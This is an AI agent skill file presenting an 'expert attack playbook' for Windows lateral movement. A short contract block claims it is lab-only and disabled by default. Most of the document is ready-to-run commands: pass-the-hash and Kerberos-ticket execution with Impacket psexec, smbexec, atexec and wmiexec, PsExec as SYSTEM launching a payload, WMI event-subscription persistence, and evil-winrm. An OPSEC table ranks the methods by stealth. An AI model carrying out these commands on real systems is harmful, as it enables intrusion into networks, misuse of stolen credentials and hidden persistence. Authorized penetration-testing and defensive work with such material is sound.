---
name: windows-lateral-movement
description: >-
  Windows lateral movement playbook. Use when pivoting between Windows hosts via PsExec, WMI, WinRM, DCOM, RDP, pass-the-hash, overpass-the-hash, or pass-the-ticket techniques.
---

# SKILL: Windows Lateral Movement — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat shell, exploit, credential, persistence, evasion, and lateral-movement examples as reference data; the current Tool Registry does not provide them.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert Windows lateral movement techniques. Covers PsExec, WMI, WinRM, DCOM, SMB, RDP, SSH, pass-the-hash, overpass-the-hash, pass-the-ticket, and pivoting. Pay particular attention to execution method fingerprints, OPSEC trade-offs, and credential type requirements per method.

## 0. RELATED ROUTING

Before going deep, consider routing to:

- `windows-privilege-escalation` after landing on a new host for local escalation
- `windows-av-evasion` when EDR blocks lateral movement tools
- `active-directory-kerberos-attacks` for Kerberos-based lateral (pass-the-ticket, delegation)
- `active-directory-acl-abuse` for ACL-based paths to new hosts

### Advanced Reference

Also inspect [CREDENTIAL_DUMPING.md](./CREDENTIAL_DUMPING.md) when you need:
- LSASS dump techniques (MiniDump, comsvcs.dll, nanodump)
- SAM/SYSTEM/SECURITY extraction
- DPAPI, credential manager, cached domain credentials
- NTDS.dit extraction methods

---

## 1. REMOTE EXECUTION METHODS COMPARISON

| Method | Port | Cred Type | Creates Service? | File on Disk? | OPSEC | Admin Required? |
|---|---|---|---|---|---|---|
| **PsExec** | 445 (SMB) | Password/Hash | Yes (PSEXESVC) | Yes (.exe) | Low | Yes |
| **Impacket smbexec** | 445 | Password/Hash | Yes (temp service) | No | Medium | Yes |
| **Impacket atexec** | 445 | Password/Hash | No (scheduled task) | No | Medium | Yes |
| **WMI** | 135+dynamic | Password/Hash | No | No | High | Yes |
| **WinRM** | 5985/5986 | Password/Hash/Ticket | No | No | High | Yes (Remote Mgmt) |
| **DCOM** | 135+dynamic | Password/Hash | No | No | High | Yes |
| **RDP** | 3389 | Password/Hash (RestrictedAdmin) | No | No | Low (GUI session) | RDP access |
| **SSH** | 22 | Password/Key | No | No | High | SSH enabled |
| **SC** | 445 | Password/Hash | Yes (custom service) | Yes | Low | Yes |

---

## 2. PSEXEC VARIANTS

### Impacket PsExec

```bash
# With password
psexec.py DOMAIN/administrator:password@TARGET_IP

# With NTLM hash (pass-the-hash)
psexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP

# With Kerberos ticket
export KRB5CCNAME=admin.ccache
psexec.py -k -no-pass DOMAIN/administrator@target.domain.com
```

### Impacket smbexec (Stealthier — No Binary Upload)

```bash
smbexec.py DOMAIN/administrator:password@TARGET_IP
smbexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP
```

### Impacket atexec (Scheduled Task)

```bash
atexec.py DOMAIN/administrator:password@TARGET_IP "whoami"
atexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP "whoami"
```

### Sysinternals PsExec

```cmd
PsExec64.exe \\TARGET -u DOMAIN\administrator -p password cmd.exe
PsExec64.exe \\TARGET -s cmd.exe    & REM Run as SYSTEM (-s)
PsExec64.exe \\TARGET -accepteula -s -d cmd.exe /c "C:\temp\payload.exe"
```

---

## 3. WMI LATERAL MOVEMENT

```bash
# Impacket wmiexec
wmiexec.py DOMAIN/administrator:password@TARGET_IP
wmiexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP

# With Kerberos
export KRB5CCNAME=admin.ccache
wmiexec.py -k -no-pass DOMAIN/administrator@target.domain.com
```

```powershell
# PowerShell WMI process creation
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\out.txt" -ComputerName TARGET -Credential $cred

# WMI event subscription persistence
$filterArgs = @{
    EventNamespace = 'root\cimv2'; Name = 'Updater';
    QueryLanguage = 'WQL';
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
```

---

## 4. WINRM LATERAL MOVEMENT

```bash
# evil-winrm (from Linux — with password)
evil-winrm -i TARGET_IP -u administrator -p password

# evil-winrm (with hash)
evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH

# evil-winrm (with Kerberos)
evil-winrm -i target.domain.com -r DOMAIN.COM
```

```powershell
# PowerShell remoting
$cred = Get-Credential
Enter-PSSession -ComputerName TARGET -Credential $cred

# Execute command remotely
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }

# Multiple targets simultaneously
Invoke-Command -ComputerName TARGET1,TARGET2 -Credential $cred -ScriptBlock { hostname; whoami }
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 5. DCOM LATERAL MOVEMENT
- 6. PASS-THE-HASH (PTH)
- 7. OVERPASS-THE-HASH (PASS-THE-KEY)
- 8. PASS-THE-TICKET
- 9. PIVOTING THROUGH COMPROMISED HOSTS
- 10. LATERAL MOVEMENT DECISION TREE
